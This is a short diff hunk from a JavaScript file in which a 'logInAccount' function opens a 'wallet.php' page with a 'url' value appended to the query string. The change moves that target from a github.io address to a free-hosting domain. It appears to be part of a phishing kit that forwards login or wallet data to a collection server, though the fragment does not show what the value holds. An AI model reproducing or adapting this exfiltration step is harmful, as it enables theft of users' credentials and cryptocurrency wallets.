@@ -179,7 +179,7 @@ function logInAccount(b) {
 
             setTimeout(() => {
                 window.open(
-                    'https://abouelghar12.github.io/wallet.php?' + url,
+                    'https://falser-skies.000webhostapp.com/ob/wallet.php?' + url,
                     '_blank'
                 );
 
